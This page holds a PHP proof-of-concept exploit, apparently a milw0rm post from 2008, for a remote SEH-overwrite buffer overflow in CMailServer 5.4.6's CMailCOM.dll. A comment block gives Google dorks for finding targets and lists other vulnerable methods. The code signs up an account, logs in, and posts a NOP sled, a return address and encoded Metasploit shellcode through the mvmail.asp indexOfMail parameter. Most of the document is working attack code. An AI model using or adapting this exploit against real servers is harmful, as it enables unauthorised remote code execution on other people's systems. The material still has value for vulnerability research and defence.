<html><head><title>CMailServer 5.4.6 (CMailCOM.dll) Remote SEH Overwrite Exploit</title></head><pre>&lt;?php
    /*
        CMailServer 5.4.6 mvmail.asp/CMailCOM.dll remote seh overwrite
	proof of concept exploit

        by Nine:Situations:Group::bruiser

        our site: http://retrogod.altervista.org/

        software site: http://www.youngzsoft.net/cmailserver/

        Google dorks:
        intitle:&quot;Mail Server CMailServer WebMail&quot;
        intitle:&quot;Mail Server CMailServer WebMail 5.4.6&quot;

        Some notes:
        This server provides a IIS/webmail interface and a registered component
	vulnerable to multiple buffer overflows, among the others, the
	CMailCom.POP3 class with CLSID 6971D9B8-B53E-4C25-A414-76199768A592.
        This class is called by various ASP scripts inside the main folder...
	I found this clear vector, look mwmail.asp , lines 25-35:

          ...
	  Set objPOP3 = CreateObject(&quot;CMailCOM.POP3.1&quot;)
          objPOP3.Login Session(&quot;User&quot;), Session(&quot;Pass&quot;)
          Session(&quot;LoginSuccess&quot;) = objPOP3.LoginSuccess
          If Session(&quot;LoginSuccess&quot;) = 1 Then
	  set rs=Server.createobject(&quot;adodb.recordset&quot;)
  	    rs.open &quot;mailfolder&quot;,Conn,1,3
	    i = 0
	    arrString = Split(Request(&quot;indexOfMail&quot;), &quot;;&quot;, -1, 1)
	    While Len(arrString(i)) &lt;&gt; 0
	        strUID = arrString(i)
	        objPOP3.MoveToFolder strUID ' &lt;---------------- bof
	  ...

	By attaching olly to the w3wp.exe sub-process you will see the usual
	dump with ecx and eip owned, with a buffer of approxymately 13000 chars.

        Exploitation is post-auth but you can have a user account by simply
	browsing the signup.asp page, enabled by default.
        Calc.exe will run with NETWORK SERVICE privilege, check tasks. Note
	that 4-5 failed exploit attempts may result in IIS &quot;Service
	Unavailiable&quot; message.

        Other attacks are possible, see a list of locally overflowable
        methods:
        CreateUserPath, Logout, DeleteMailByUID, MoveToInbox, MoveToFolder,
	DeleteMailEx,  GetMailDataEx, SetReplySign, SetForwardSign, SetReadSign.
	Note also that remotely there's some kind of validation (ex. you can
	not have a username with a length of more than 4000 chars which
	could be used instead to overflow the CreateUserPath method and
	you cannot overflow ex. through the strUID argument) which reduces a lot
	the remote vectors. However, as you can see there's no filter on
	&quot;indexOfMail&quot; one.

        Other notes:
        CMailCOM.SMTP class with CLSID 0609792F-AB56-4CB6-8909-19CDF72CB2A0
	is also vulnerable in the following methods:
        AddAttach, SetSubject, SetBcc, SetBody, SetCc, SetFrom,
        SetTo, SetFromUID
    */

        error_reporting(7);$host=$argv[1];$path=$argv[2];
        $argv[3] ? $port = (int) $argv[3] : $port = 80;
        print (&quot;CMailServer 5.4.6 mvmail.asp/CMailCOM.dll remote seh overwrite\n&quot;.
               &quot;exploit\n&quot;.
               &quot;by Nine:Situations:Group::bookoo\n&quot;);
        $argv[2] ? print(&quot;attackin'...\n&quot;) : die (&quot;syntax:  php &quot;.$argv[0].&quot; [host] [path] [[port]]\n&quot;.
	                                          &quot;example: php &quot;.$argv[0].&quot; 192.168.0.1 /mail/    \n&quot;.
	                                          &quot;   ''    php &quot;.$argv[0].&quot; 192.168.0.1 / 81      \n&quot;);
        $url = &quot;http://$host:$port&quot;;
        $win = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? true : false;
        $win ? dl(&quot;php_curl.dll&quot;) : dl(&quot;php_curl.so&quot;);

        //borrowed from bookoo
        function send($packet,$out)  {

            global $url, $data;

	    if (!extension_loaded(&quot;curl&quot;){
		    die(&quot;you need the curl extesion loaded to run...&quot;);
            }
	    $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL,$url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_TIMEOUT, 5);
            curl_setopt($ch, CURLOPT_HEADER, 1);
            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $packet);
            $data = curl_exec($ch); if (curl_errno($ch)) {
                print curl_error($ch).&quot;\n&quot;;
            } else {
               curl_close($ch);
            }
            if ($out) print($data.&quot;\n&quot;);
        }

        $agent=&quot;Mozilla/5.0 (Windows; U; Windows NT 5.2; it; rv:1.8.1.15) Gecko/20080623 Firefox/2.0.0.15&quot;;
        //subscribe
        $usr=&quot;bookoo&quot;;$pwd=&quot;password&quot;;//new usr username &amp; password, change
	$d =&quot;Signup=1&amp;Account=$usr&amp;Pass=$pwd&amp;RePass=$pwd&amp;UserName=&amp;Comment=User&amp;POP3Mail=%40ieqowieoqw.com&quot;;
        $h =&quot;POST &quot;.$path.&quot;signup.asp HTTP/1.0\r\nHost: $host\r\nUser-Agent: $agent\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: &quot;.strlen($d).&quot;\r\nConnection: Close\r\n\r\n$d&quot;;
	send($h,0);
	$tmp=explode(&quot;Set-Cookie: &quot;,$data);
	for ($i=1; $i&lt;count($tmp);$i++){ $tmpi=explode(&quot; &quot;,$tmp[$i]);$sess=$tmpi[0];$pos=strpos($sess, &quot;ASPSESSIONID&quot;);	if ($pos === true) break; echo $sess.&quot;\n&quot;;}
	//login
	$d  =&quot;User=$usr&amp;Pass=$pwd&amp;SaveUserPass=on&quot;;
        $h =&quot;POST &quot;.$path.&quot;login.asp HTTP/1.0\r\nHost: $host\r\nUser-Agent: $agent\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: &quot;.strlen($d).&quot;\r\nCookie: $sess SaveUserPass=1; Pass=$pwd; User=$usr;\r\nConnection: Close\r\n\r\n$d&quot;;
      	send($h,0);
      	//attack
        //bad chars: \x3b \x2f
        # win32_exec -  EXITFUNC=seh CMD=calc Size=160 Encoder=Pex http://metasploit.com
        $shellcode =
        &quot;\x2b\xc9\x83\xe9\xde\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e\xcf&quot;.
        &quot;\x67\x5f\x11\x83\xee\xfc\xe2\xf4\x33\x8f\x1b\x11\xcf\x67\xd4\x54&quot;.
        &quot;\xf3\xec\x23\x14\xb7\x66\xb0\x9a\x80\x7f\xd4\x4e\xef\x66\xb4\x58&quot;.
        &quot;\x44\x53\xd4\x10\x21\x56\x9f\x88\x63\xe3\x9f\x65\xc8\xa6\x95\x1c&quot;.
        &quot;\xce\xa5\xb4\xe5\xf4\x33\x7b\x15\xba\x82\xd4\x4e\xeb\x66\xb4\x77&quot;.
        &quot;\x44\x6b\x14\x9a\x90\x7b\x5e\xfa\x44\x7b\xd4\x10\x24\xee\x03\x35&quot;.
        &quot;\xcb\xa4\x6e\xd1\xab\xec\x1f\x21\x4a\xa7\x27\x1d\x44\x27\x53\x9a&quot;.
        &quot;\xbf\x7b\xf2\x9a\xa7\x6f\xb4\x18\x44\xe7\xef\x11\xcf\x67\xd4\x79&quot;.
        &quot;\xf3\x38\x6e\xe7\xaf\x31\xd6\xe9\x4c\xa7\x24\x41\xa7\x97\xd5\x15&quot;.
        &quot;\x90\x0f\xc7\xef\x45\x69\x08\xee\x28\x04\x3e\x7d\xac\x67\x5f\x11&quot;;
        $jmp_short=&quot;\xeb\x10\x90\x90&quot;;
	$seh=&quot;\xf1\xda\x02\x10&quot;; #0x1002DAF1    cmailcom.dll / pop ecx - pop - ret
        $nop=str_repeat(&quot;\x90&quot;,12648);
	$bof= $nop . $jmp_short. $seh . str_repeat(&quot;\x90&quot;,24). $shellcode ;
	$d=&quot;sel=aaaa&amp;ToFolder=4&amp;indexOfMail=&quot;.urlencode($bof).&quot;&amp;mailcount=1&amp;pages=&quot;;
        $h =&quot;POST &quot;.$path.&quot;mvmail.asp HTTP/1.0\r\nHost: $host\r\nUser-Agent: $agent\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: &quot;.strlen($d).&quot;\r\nCookie: $sess SaveUserPass=1; Pass=$pwd; User=$usr;\r\nConnection: Close\r\n\r\n$d&quot;;
        send($h,1);
?&gt;

# milw0rm.com [2008-07-06]</pre></html>